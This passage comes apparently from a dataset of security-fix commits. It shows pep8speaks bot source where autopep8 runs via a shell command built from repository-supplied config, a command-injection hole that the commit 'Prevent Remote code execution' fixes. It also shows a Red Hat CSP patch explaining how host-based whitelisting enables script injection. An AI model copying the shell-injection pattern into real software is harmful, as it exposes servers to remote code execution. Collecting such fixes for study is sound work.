else:\n            comment_header = config[\"message\"][\"updated\"][\"header\"] + \"\\n\\n\"\n\n    ## Body\n    ERROR = False  # Set to True when any pep8 error exists\n    comment_body = []\n    for file, issues in data[\"results\"].items():\n        if len(issues) == 0:\n            if not config[\"only_mention_files_with_errors\"]:\n                comment_body.append(\n                    \" - There are no PEP8 issues in the\"\n                    \" file [`{0}`]({1}) !\".format(file, data[file + \"_link\"]))\n        else:\n            ERROR = True\n            comment_body.append(\n                \" - In the file [`{0}`]({1}), following \"\n                \"are the PEP8 issues :\\n\".format(file, data[file + \"_link\"]))\n            for issue in issues:\n                ## Replace filename with L\n                error_string = issue.replace(file + \":\", \"Line \")\n\n                ## Link error codes to search query\n                error_string_list = error_string.split(\" \")\n                code = error_string_list[2]\n                code_url = \"https:\/\/duckduckgo.com\/?q=pep8%20{0}\".format(code)\n                error_string_list[2] = \"[{0}]({1})\".format(code, code_url)\n\n                ## Link line numbers in the file\n                line, col = error_string_list[1][:-1].split(\":\")\n                line_url = data[file + \"_link\"] + \"#L\" + line\n                error_string_list[1] = \"[{0}:{1}]({2}):\".format(line, col, line_url)\n                error_string = \" \".join(error_string_list)\n                error_string = error_string.replace(\"Line [\", \"[Line \")\n                comment_body.append(\"\\n> {0}\".format(error_string))\n\n        comment_body.append(\"\\n\\n\")\n        if len(data[\"extra_results\"][file]) > 0:\n            comment_body.append(\" - Complete extra results for this file :\\n\\n\")\n            comment_body.append(\"> \" + \"\".join(data[\"extra_results\"][file]))\n            comment_body.append(\"---\\n\\n\")\n\n    if config[\"only_mention_files_with_errors\"] and not ERROR:\n        comment_body.append(\"Cheers ! There are no PEP8 issues in this Pull Request. :beers: \")\n\n\n    comment_body = ''.join(comment_body)\n\n\n    ## Footer\n    comment_footer = []\n    if request.json[\"action\"] == \"opened\":\n        comment_footer.append(config[\"message\"][\"opened\"][\"footer\"])\n    elif request.json[\"action\"] in [\"synchronize\", \"reopened\"]:\n        comment_footer.append(config[\"message\"][\"updated\"][\"footer\"])\n\n    comment_footer = ''.join(comment_footer)\n\n    return comment_header, comment_body, comment_footer, ERROR\n\n\ndef comment_permission_check(data, comment):\n    \"\"\"Check for quite and resume status or duplicate comments\"\"\"\n    PERMITTED_TO_COMMENT = True\n    repository = data[\"repository\"]\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    # Check for duplicate comment\n    url = \"https:\/\/api.github.com\/repos\/{}\/issues\/{}\/comments\"\n    url = url.format(repository, str(data[\"pr_number\"]))\n    comments = requests.get(url, headers=headers, auth=auth).json()\n\n    # Get the last comment by the bot\n    last_comment = \"\"\n    for old_comment in reversed(comments):\n        if old_comment[\"user\"][\"id\"] == 24736507:  # ID of @pep8speaks\n            last_comment = old_comment[\"body\"]\n            break\n\n    \"\"\"\n    # Disabling this because only a single comment is made per PR\n    text1 = ''.join(BeautifulSoup(markdown(comment)).findAll(text=True))\n    text2 = ''.join(BeautifulSoup(markdown(last_comment)).findAll(text=True))\n    if text1 == text2.replace(\"submitting\", \"updating\"):\n        PERMITTED_TO_COMMENT = False\n    \"\"\"\n\n    # Check if the bot is asked to keep quiet\n    for old_comment in reversed(comments):\n        if '@pep8speaks' in old_comment['body']:\n            if 'resume' in old_comment['body'].lower():\n                break\n            elif 'quiet' in old_comment['body'].lower():\n                PERMITTED_TO_COMMENT = False\n\n\n    return PERMITTED_TO_COMMENT\n\n\ndef create_or_update_comment(data, comment):\n    comment_mode = None\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    query = \"https:\/\/api.github.com\/repos\/{}\/issues\/{}\/comments\"\n    query = query.format(data[\"repository\"], str(data[\"pr_number\"]))\n    comments = requests.get(query, headers=headers, auth=auth).json()\n\n    # Get the last comment id by the bot\n    last_comment_id = None\n    for old_comment in comments:\n        if old_comment[\"user\"][\"id\"] == 24736507:  # ID of @pep8speaks\n            last_comment_id = old_comment[\"id\"]\n            break\n\n    if last_comment_id is None:  # Create a new comment\n        response = requests.post(query, json={\"body\": comment}, headers=headers, auth=auth)\n        data[\"comment_response\"] = response.json()\n    else:  # Update the last comment\n        utc_time = datetime.datetime.utcnow()\n        time_now = utc_time.strftime(\"%B %d, %Y at %H:%M Hours UTC\")\n        comment += \"\\n\\n##### Comment last updated on {}\"\n        comment = comment.format(time_now)\n\n        query = \"https:\/\/api.github.com\/repos\/{}\/issues\/comments\/{}\"\n        query = query.format(data[\"repository\"], str(last_comment_id))\n        response = requests.patch(query, json={\"body\": comment}, headers=headers, auth=auth)\n\n\ndef autopep8(data, config):\n    # Run pycodestyle\n\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(data[\"diff_url\"], headers=headers, auth=auth)\n    ## All the python files with additions\n    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)\n\n    # A dictionary with filename paired with list of new line numbers\n    py_files = {}\n\n    for patchset in patch:\n        if patchset.target_file[-3:] == '.py':\n            py_file = patchset.target_file[1:]\n            py_files[py_file] = []\n            for hunk in patchset:\n                for line in hunk.target_lines():\n                    if line.is_added:\n                        py_files[py_file].append(line.target_line_no)\n\n    # Ignore errors and warnings specified in the config file\n    to_ignore = \",\".join(config[\"pycodestyle\"][\"ignore\"])\n    arg_to_ignore = \"\"\n    if len(to_ignore) > 0:\n        arg_to_ignore = \"--ignore \" + to_ignore\n\n    for file in py_files:\n        filename = file[1:]\n        url = \"https:\/\/raw.githubusercontent.com\/{}\/{}\/{}\"\n        url = url.format(data[\"repository\"], data[\"sha\"], file)\n        r = requests.get(url, headers=headers, auth=auth)\n        with open(\"file_to_fix.py\", 'w+', encoding=r.encoding) as file_to_fix:\n            file_to_fix.write(r.text)\n\n        cmd = 'autopep8 file_to_fix.py --diff {arg_to_ignore}'.format(\n            arg_to_ignore=arg_to_ignore)\n        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n        stdout, _ = proc.communicate()\n        data[\"diff\"][filename] = stdout.decode(r.encoding)\n\n        # Fix the errors\n        data[\"diff\"][filename] = data[\"diff\"][filename].replace(\"file_to_check.py\", filename)\n        data[\"diff\"][filename] = data[\"diff\"][filename].replace(\"\\\\\", \"\\\\\\\\\")\n\n        ## Store the link to the file\n        url = \"https:\/\/github.com\/{}\/blob\/{}{}\"\n        data[filename + \"_link\"] = url.format(data[\"repository\"], data[\"sha\"], file)\n        os.remove(\"file_to_fix.py\")\n\n\ndef create_gist(data, config):\n    \"\"\"Create gists for diff files\"\"\"\n    REQUEST_JSON = {}\n    REQUEST_JSON[\"public\"] = True\n    REQUEST_JSON[\"files\"] = {}\n    REQUEST_JSON[\"description\"] = \"In response to @{0}'s comment : {1}\".format(\n        data[\"reviewer\"], data[\"review_url\"])\n\n    for file, diffs in data[\"diff\"].items():\n        if len(diffs) != 0:\n            REQUEST_JSON[\"files\"][file.split(\"\/\")[-1] + \".diff\"] = {\n                \"content\": diffs\n            }\n\n    # Call github api to create the gist\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    url = \"https:\/\/api.github.com\/gists\"\n    res = requests.post(url, json=REQUEST_JSON, headers=headers, auth=auth).json()\n    data[\"gist_response\"] = res\n    data[\"gist_url\"] = res[\"html_url\"]\n\n\ndef delete_if_forked(data):\n    FORKED = False\n    url = \"https:\/\/api.github.com\/user\/repos\"\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(url, headers=headers, auth=auth)\n    for repo in r.json():\n        if repo[\"description\"]:\n            if data[\"target_repo_fullname\"] in repo[\"description\"]:\n                FORKED = True\n                r = requests.delete(\"https:\/\/api.github.com\/repos\/\"\n                                \"{}\".format(repo[\"full_name\"]),\n                                headers=headers, auth=auth)\n    return FORKED\n\n\ndef fork_for_pr(data):\n    FORKED = False\n    url = \"https:\/\/api.github.com\/repos\/{}\/forks\"\n    url = url.format(data[\"target_repo_fullname\"])\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.post(url, headers=headers, auth=auth)\n    if r.status_code == 202:\n        data[\"fork_fullname\"] = r.json()[\"full_name\"]\n        FORKED = True\n    else:\n        data[\"error\"] = \"Unable to fork\"\n    return FORKED\n\n\ndef update_fork_desc(data):\n    # Check if forked (takes time)\n    url = \"https:\/\/api.github.com\/repos\/{}\".format(data[\"fork_fullname\"])\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(url, headers=headers, auth=auth)\n    ATTEMPT = 0\n    while(r.status_code != 200):\n        time.sleep(5)\n        r = requests.get(url, headers=headers, auth=auth)\n        ATTEMPT += 1\n        if ATTEMPT > 10:\n            data[\"error\"] = \"Forking is taking more than usual time\"\n            break\n\n    full_name = data[\"target_repo_fullname\"]\n    author, name = full_name.split(\"\/\")\n    request_json = {\n        \"name\": name,\n        \"description\": \"Forked from @{}'s {}\".format(author, full_name)\n    }\n    r = requests.patch(url, data=json.dumps(request_json), headers=headers, auth=auth)\n    if r.status_code != 200:\n        data[\"error\"] = \"Could not update description of the fork\"\n\n\ndef create_new_branch(data):\n    url = \"https:\/\/api.github.com\/repos\/{}\/git\/refs\/heads\"\n    url = url.format(data[\"fork_fullname\"])\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    sha = None\n    r = requests.get(url, headers=headers, auth=auth)\n    for ref in r.json():\n        if ref[\"ref\"].split(\"\/\")[-1] == data[\"target_repo_branch\"]:\n            sha = ref[\"object\"][\"sha\"]\n\n    url = \"https:\/\/api.github.com\/repos\/{}\/git\/refs\"\n    url = url.format(data[\"fork_fullname\"])\n    data[\"new_branch\"] = \"{}-pep8-patch\".format(data[\"target_repo_branch\"])\n    request_json = {\n        \"ref\": \"refs\/heads\/{}\".format(data[\"new_branch\"]),\n        \"sha\": sha,\n    }\n    r = requests.post(url, json=request_json, headers=headers, auth=auth)\n\n    if r.status_code != 200:\n        data[\"error\"] = \"Could not create new branch in the fork\"\n\n\ndef autopep8ify(data, config):\n    # Run pycodestyle\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(data[\"diff_url\"], headers=headers, auth=auth)\n\n    ## All the python files with additions\n    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)\n\n    # A dictionary with filename paired with list of new line numbers\n    py_files = {}\n\n    for patchset in patch:\n        if patchset.target_file[-3:] == '.py':\n            py_file = patchset.target_file[1:]\n            py_files[py_file] = []\n            for hunk in patchset:\n                for line in hunk.target_lines():\n                    if line.is_added:\n                        py_files[py_file].append(line.target_line_no)\n\n    # Ignore errors and warnings specified in the config file\n    to_ignore = \",\".join(config[\"pycodestyle\"][\"ignore\"])\n    arg_to_ignore = \"\"\n    if len(to_ignore) > 0:\n        arg_to_ignore = \"--ignore \" + to_ignore\n\n    for file in py_files:\n        filename = file[1:]\n        url = \"https:\/\/raw.githubusercontent.com\/{}\/{}\/{}\"\n        url = url.format(data[\"repository\"], data[\"sha\"], file)\n        r = requests.get(url, headers=headers, auth=auth)\n        with open(\"file_to_fix.py\", 'w+', encoding=r.encoding) as file_to_fix:\n            file_to_fix.write(r.text)\n\n        cmd = 'autopep8 file_to_fix.py {arg_to_ignore}'.format(\n            arg_to_ignore=arg_to_ignore)\n        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n        stdout, _ = proc.communicate()\n        data[\"results\"][filename] = stdout.decode(r.encoding)\n\n        os.remove(\"file_to_fix.py\")\n\n\ndef commit(data):\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    fullname = data.get(\"fork_fullname\")\n\n    for file, new_file in data[\"results\"].items():\n        url = \"https:\/\/api.github.com\/repos\/{}\/contents\/{}\"\n        url = url.format(fullname, file)\n        params = {\"ref\": data[\"new_branch\"]}\n        r = requests.get(url, params=params, headers=headers, auth=auth)\n        sha_blob = r.json().get(\"sha\")\n        params[\"path\"] = file\n        content_code = base64.b64encode(new_file.encode()).decode(\"utf-8\")\n        request_json = {\n            \"path\": file,\n            \"message\": \"Fix pep8 errors in {}\".format(file),\n            \"content\": content_code,\n            \"sha\": sha_blob,\n            \"branch\": data.get(\"new_branch\"),\n        }\n        r = requests.put(url, json=request_json, headers=headers, auth=auth)\n\n\ndef create_pr(data):\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    url = \"https:\/\/api.github.com\/repos\/{}\/pulls\"\n    url = url.format(data[\"target_repo_fullname\"])\n    request_json = {\n        \"title\": \"Fix pep8 errors\",\n        \"head\": \"pep8speaks:{}\".format(data[\"new_branch\"]),\n        \"base\": data[\"target_repo_branch\"],\n        \"body\": \"The changes are suggested by autopep8\",\n    }\n    r = requests.post(url, json=request_json, headers=headers, auth=auth)\n    if r.status_code == 201:\n        data[\"pr_url\"] = r.json()[\"html_url\"]\n    else:\n        data[\"error\"] = \"Pull request could not be created\"\n"}},"msg":"Prevent Remote code execution, Closes #28"}},"https:\/\/github.com\/RedHatProductSecurity\/component-registry":{"93f67fdeccaa604aebd7ed2bb690ebaf16c3e702":{"url":"https:\/\/api.github.com\/repos\/RedHatProductSecurity\/component-registry\/commits\/93f67fdeccaa604aebd7ed2bb690ebaf16c3e702","html_url":"https:\/\/github.com\/RedHatProductSecurity\/component-registry\/commit\/93f67fdeccaa604aebd7ed2bb690ebaf16c3e702","message":"List exact file paths to avoid insecure host-based CSP whitelisting\n\n\"cdnjs.cloudflare.com\" hosts Angular libraries. If there is any\nHTML injection bug in Corgi, whitelisting that domain lets an\nattacker include the Angular libs and achieve code execution.\n\nBest practices suggest using hash- or nonce-based whitelisting\ninstead of host-based whitelisting.\nBut external stylesheet hashes aren't supported in Chrome \/ Firefox.\nOnly inline style elements \/ style attributes can be allowed via a hash.\nExternal script hashes are supported in Chrome, but not in Firefox.\nSo we list the path instead.\n\nSubResource Integrity hashes on the remote resource protect us\nwhen an attacker changes the content of the remote file on the CDN,\nbut don't protect us from HTML injection bugs in Corgi itself\n(attackers just inject new dependencies with no \/ a valid SRI hash).\nWhitelisting the exact path in our CSP does prevent the above.\nSo both together should be secure.","sha":"93f67fdeccaa604aebd7ed2bb690ebaf16c3e702","keyword":"remote code execution prevent","diff":"diff --git a\/config\/settings\/base.py b\/config\/settings\/base.py\nindex 37f71df1..3761ed82 100644\n--- a\/config\/settings\/base.py\n+++ b\/config\/settings\/base.py\n@@ -89,17 +89,28 @@\n     # Inline styles generated by DRF-Spectacular for API documentation\n     \"'sha512-F9xfkMd5AAuiwcrWne2TQOC\/IV9cbM10EBJ+Wo\/+lu0RaeQOj6T8ucgwI9mgpDaK0FT\/YGD5Hrc\/Bne\/\"\n     + \"Q3Ovvg=='\",\n-    \"https:\/\/cdnjs.cloudflare.com\",\n+    # Content-Security-Policy hashes for external stylesheets aren't supported\n+    # SubResource Integrity hashes guarantee that below files have not been modified\n+    # Whitelisting the exact path allows only these files, and not others on the same domain\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/css\/patternfly.min.css\",\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/css\/patternfly-additions.min.css\",\n )\n \n CSP_FONT_SRC = (\n     \"'self'\",\n-    \"https:\/\/cdnjs.cloudflare.com\",\n+    # Too many fonts to list every hash \/ path\n+    # Safe since fonts don't allow code execution or resource inclusion\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/fonts\/\",\n )\n \n CSP_SCRIPT_SRC = (\n     \"'self'\",\n-    \"https:\/\/cdnjs.cloudflare.com\",\n+    # Content-Security-Policy hashes for external scripts aren't supported in Firefox\n+    # SubResource Integrity hashes guarantee that below files have not been modified\n+    # Whitelisting the exact path allows only these files, and not others on the same domain\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/jquery\/3.5.1\/jquery.min.js\",\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/twitter-bootstrap\/3.4.1\/js\/bootstrap.min.js\",\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/js\/patternfly.min.js\",\n )\n \n CSP_IMG_SRC = (\n","files":{"\/config\/settings\/base.py":{"changes":[{"diff":"\n     # Inline styles generated by DRF-Spectacular for API documentation\n     \"'sha512-F9xfkMd5AAuiwcrWne2TQOC\/IV9cbM10EBJ+Wo\/+lu0RaeQOj6T8ucgwI9mgpDaK0FT\/YGD5Hrc\/Bne\/\"\n     + \"Q3Ovvg=='\",\n-    \"https:\/\/cdnjs.cloudflare.com\",\n+    # Content-Security-Policy hashes for external stylesheets aren't supported\n+    # SubResource Integrity hashes guarantee that below files have not been modified\n+    # Whitelisting the exact path allows only these files, and not others on the same domain\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/css\/patternfly.min.css\",\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/css\/patternfly-additions.min.css\",\n )\n \n CSP_FONT_SRC = (\n     \"'self'\",\n-    \"https:\/\/cdnjs.cloudflare.com\",\n+    # Too many fonts to list every hash \/ path\n+    # Safe since fonts don't allow code execution or resource inclusion\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/fonts\/\",\n )\n \n CSP_SCRIPT_SRC = (\n     \"'self'\",\n-    \"https:\/\/cdnjs.cloudflare.com\",\n+    # Content-Security-Policy hashes for external scripts aren't supported in Firefox\n+    # SubResource Integrity hashes guarantee that below files have not been modified\n+    # Whitelisting the exact path allows only these files, and not others on the same domain\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/jquery\/3.5.1\/jquery.min.js\",\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/twitter-bootstrap\/3.4.1\/js\/bootstrap.min.js\",\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/js\/patternfly.min.js\",\n )\n \n CSP_IMG_SRC = (\n","add":14,"remove":3,"filename":"\/config\/settings\/base.py","badparts":["    \"https:\/\/cdnjs.cloudflare.com\",","    \"https:\/\/cdnjs.cloudflare.com\",","    \"https:\/\/cdnjs.cloudflare.com\","],"goodparts":[" \"Q3Ovvg=='\",","    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/css\/patternfly.min.css\",","    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/css\/patternfly-additions.min.css\",","    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/fonts\/\",","    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/jquery\/3.5.1\/jquery.min.js\",","    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/twitter-bootstrap\/3.4.1\/js\/bootstrap.min.js\",","    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/js\/patternfly.min.js\","]},{"diff":"\n     # Inline styles generated by DRF-Spectacular for API documentation\n     \"'sha512-F9xfkMd5AAuiwcrWne2TQOC\/IV9cbM10EBJ+Wo\/+lu0RaeQOj6T8ucgwI9mgpDaK0FT\/YGD5Hrc\/Bne\/\"\n     + \"Q3Ovvg=='\",\n-    \"https:\/\/cdnjs.cloudflare.com\",\n+    # Content-Security-Policy hashes for external stylesheets aren't supported\n+    # SubResource Integrity hashes guarantee that below files have not been modified\n+    # Whitelisting the exact path allows only these files, and not others on the same domain\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/css\/patternfly.min.css\",\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/css\/patternfly-additions.min.css\",\n )\n \n CSP_FONT_SRC = (\n     \"'self'\",\n-    \"https:\/\/cdnjs.cloudflare.com\",\n+    # Too many fonts to list every hash \/ path\n+    # Safe since fonts don't allow code execution or resource inclusion\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/fonts\/\",\n )\n \n CSP_SCRIPT_SRC = (\n     \"'self'\",\n-    \"https:\/\/cdnjs.cloudflare.com\",\n+    # Content-Security-Policy hashes for external scripts aren't supported in Firefox\n+    # SubResource Integrity hashes guarantee that below files have not been modified\n+    # Whitelisting the exact path allows only these files, and not others on the same domain\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/jquery\/3.5.1\/jquery.min.js\",\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/twitter-bootstrap\/3.4.1\/js\/bootstrap.min.js\",\n+    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/js\/patternfly.min.js\",\n )\n \n CSP_IMG_SRC = (\n","add":14,"remove":3,"filename":"\/config\/settings\/base.py","badparts":["    \"https:\/\/cdnjs.cloudflare.com\",","    \"https:\/\/cdnjs.cloudflare.com\",","    \"https:\/\/cdnjs.cloudflare.com\","],"goodparts":[" \"Q3Ovvg=='\",","    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/css\/patternfly.min.css\",","    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/css\/patternfly-additions.min.css\",","    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/fonts\/\",","    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/jquery\/3.5.1\/jquery.min.js\",","    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/twitter-bootstrap\/3.4.1\/js\/bootstrap.min.js\",","    \"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/patternfly\/3.59.5\/js\/patternfly.min.js\","]}],"source":"\nimport os from distutils.util import strtobool from pathlib import Path from config.utils import get_env from corgi import __version__ as CORGI_VERSION BASE_DIR=Path(__file__).resolve().parent.parent.parent CA_CERT=os.getenv(\"REQUESTS_CA_BUNDLE\") DEBUG=False ADMINS=[ tuple(name_and_email.split(\";\")) for name_and_email in os.getenv(\"CORGI_ADMINS\", \"\").split(\",\") ] DOCS_URL=os.getenv(\"CORGI_DOCS_URL\") OPENSHIFT_BUILD_COMMIT=os.getenv(\"OPENSHIFT_BUILD_COMMIT\") PRODSEC_EMAIL=os.getenv(\"PRODSEC_EMAIL\") CORGI_DOMAIN=os.getenv(\"CORGI_DOMAIN\") if CORGI_DOMAIN: CSRF_COOKIE_DOMAIN=CORGI_DOMAIN LANGUAGE_COOKIE_DOMAIN=CORGI_DOMAIN SESSION_COOKIE_DOMAIN=CORGI_DOMAIN EMAIL_HOST=os.getenv(\"CORGI_EMAIL_HOST\", \"localhost\") EMAIL_PORT=1025 if EMAIL_HOST==\"localhost\" else 25 EMAIL_USE_TLS=False if EMAIL_HOST==\"localhost\" else True SERVER_EMAIL=os.getenv(\"CORGI_SERVER_EMAIL\", \"root@localhost\") DEFAULT_FROM_EMAIL=SERVER_EMAIL APPEND_SLASH=False CSRF_COOKIE_HTTPONLY=True CSRF_COOKIE_SECURE=True CSRF_COOKIE_NAME=\"corgi_csrf_token\" CSRF_COOKIE_SAMESITE=\"Strict\" LANGUAGE_COOKIE_HTTPONLY=True LANGUAGE_COOKIE_SECURE=True LANGUAGE_COOKIE_NAME=\"corgi_language\" LANGUAGE_COOKIE_SAMESITE=\"Strict\" SESSION_COOKIE_HTTPONLY=True SESSION_COOKIE_SECURE=True SESSION_COOKIE_NAME=\"corgi_session_id\" SESSION_COOKIE_SAMESITE=\"Strict\" SECURE_HSTS_SECONDS=15768000 SECURE_HSTS_INCLUDE_SUBDOMAINS=True SECURE_CONTENT_TYPE_NOSNIFF=True SECURE_BROWSER_XSS_FILTER=True X_FRAME_OPTIONS=\"DENY\" CSP_STYLE_SRC=( \"'self'\", \"'sha512-JWyI0O03Zg7yL2CuIaqUpB5SsITGjnbsdcl+R+S1KgDFcAF+SaYLQpiOvV4y9s3RFceDkcPSmo557Y6aIOe+\" +\"Sw=='\", \"'sha512-F9xfkMd5AAuiwcrWne2TQOC\/IV9cbM10EBJ+Wo\/+lu0RaeQOj6T8ucgwI9mgpDaK0FT\/YGD5Hrc\/Bne\/\" +\"Q3Ovvg=='\", \"https:\/\/cdnjs.cloudflare.com\", ) CSP_FONT_SRC=( \"'self'\", \"https:\/\/cdnjs.cloudflare.com\", ) CSP_SCRIPT_SRC=( \"'self'\", \"https:\/\/cdnjs.cloudflare.com\", ) CSP_IMG_SRC=( \"'self'\", \"data:\", ) CSP_DEFAULT_SRC=( \"'self'\", \"data:\", ) DATETIME_FORMAT=\"r\" INSTALLED_APPS=[ \"django.contrib.auth\", \"django.contrib.contenttypes\", \"django.contrib.sessions\", \"django.contrib.messages\", \"django.contrib.staticfiles\", \"django.contrib.humanize\", \"django.contrib.postgres\", \"django_celery_results\", \"django_celery_beat\", \"drf_spectacular\", \"drf_spectacular_sidecar\", \"mptt\", \"rest_framework\", \"django_filters\", \"corgi.api\", \"corgi.core\", \"corgi.collectors\", \"corgi.monitor\", \"corgi.tasks\", \"corgi.web\", ] MIDDLEWARE=[ \"django.middleware.security.SecurityMiddleware\", \"whitenoise.middleware.WhiteNoiseMiddleware\", \"django.contrib.sessions.middleware.SessionMiddleware\", \"django.middleware.common.CommonMiddleware\", \"django.middleware.csrf.CsrfViewMiddleware\", \"django.contrib.auth.middleware.AuthenticationMiddleware\", \"django.contrib.messages.middleware.MessageMiddleware\", \"django.middleware.clickjacking.XFrameOptionsMiddleware\", \"django.middleware.gzip.GZipMiddleware\", \"csp.middleware.CSPMiddleware\", ] ROOT_URLCONF=\"config.urls\" TEMPLATES: list[dict]=[ { \"BACKEND\": \"django.template.backends.django.DjangoTemplates\", \"DIRS\":[str(BASE_DIR \/ \"corgi\/web\/templates\")], \"APP_DIRS\": True, \"OPTIONS\":{ \"context_processors\":[ \"django.template.context_processors.debug\", \"django.template.context_processors.request\", \"django.contrib.auth.context_processors.auth\", \"django.contrib.messages.context_processors.messages\", ], }, }, ] WSGI_APPLICATION=\"config.wsgi.application\" LOG_FORMAT_START=( \"%(asctime)s.%(msecs)03d+00:00 thread=%(thread)d, name=%(name)s, lineno=%(lineno)d\" ) LOG_FORMAT_END=f'level=%(levelname)s, app=corgi, environ={get_env()}, msg=\"%(message)s\"' LOG_DATE_FORMAT=\"%Y-%m-%dT%H:%M:%S\" LOGGING={ \"version\": 1, \"disable_existing_loggers\": False, \"formatters\":{ \"default\":{ \"format\": f\"{LOG_FORMAT_START},{LOG_FORMAT_END}\", \"datefmt\": f\"{LOG_DATE_FORMAT}\", }, }, \"filters\":{ \"require_debug_false\":{ \"()\": \"django.utils.log.RequireDebugFalse\", }, }, \"handlers\":{ \"console\":{ \"class\": \"logging.StreamHandler\", \"formatter\": \"default\", }, \"mail_admins\":{ \"class\": \"django.utils.log.AdminEmailHandler\", \"filters\":[\"require_debug_false\"], \"level\": \"ERROR\", }, }, \"root\":{ \"handlers\":[\"console\"], \"level\": \"WARNING\", }, \"loggers\":{ \"django\":{\"handlers\":[\"console\"], \"level\": \"WARNING\"}, \"django.request\":{\"handlers\":[\"mail_admins\"], \"level\": \"WARNING\"}, \"corgi\":{\"handlers\":[\"console\"], \"level\": \"INFO\", \"propagate\": False}, }, } DATABASES={ \"default\":{ \"ENGINE\": \"django.db.backends.postgresql\", \"NAME\": os.getenv(\"CORGI_DB_NAME\", \"corgi-db\"), \"USER\": os.getenv(\"CORGI_DB_USER\", \"corgi-db-user\"), \"PASSWORD\": os.getenv(\"CORGI_DB_PASSWORD\", \"test\"), \"HOST\": os.getenv(\"CORGI_DB_HOST\", \"localhost\"), \"PORT\": os.getenv(\"CORGI_DB_PORT\", \"5432\"), \"OPTIONS\":{\"gssencmode\": \"disable\"}, } } DEFAULT_AUTO_FIELD=\"django.db.models.BigAutoField\" LANGUAGE_CODE=\"en-us\" TIME_ZONE=\"UTC\" USE_I18N=False USE_L10N=False USE_TZ=True STATIC_URL=\"\/static\/\" STATIC_ROOT=str(BASE_DIR \/ \"staticfiles\") STATICFILES_STORAGE=\"whitenoise.storage.CompressedManifestStaticFilesStorage\" CELERY_BROKER_URL=os.getenv(\"CORGI_REDIS_URL\", \"redis:\/\/redis:6379\") CELERY_RESULT_BACKEND=\"django-db\" CELERY_RESULT_BACKEND_ALWAYS_RETRY=True CELERY_RESULT_BACKEND_MAX_RETRIES=2 CELERY_TASK_SOFT_TIME_LIMIT=900 CELERY_LONGEST_SOFT_TIME_LIMIT=2400 CELERY_WORKER_CONCURRENCY=5 